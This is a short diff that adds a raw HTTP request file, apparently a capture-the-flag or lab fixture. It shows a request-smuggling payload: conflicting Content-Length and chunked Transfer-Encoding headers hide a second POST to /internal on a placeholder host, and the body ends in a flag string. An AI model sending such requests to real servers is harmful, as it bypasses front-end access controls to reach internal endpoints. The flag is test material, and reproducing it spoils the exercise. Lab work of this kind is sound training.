@@ -1,0 +1,12 @@
+POST /submit HTTP/1.1
+Host: training.invalid
+Content-Length: 108
+Transfer-Encoding: chunked
+
+0
+
+POST /internal HTTP/1.1
+Host: training.invalid
+Content-Length: 32
+
+FALCON{f693e6f5fcb4127bdd4fd364}
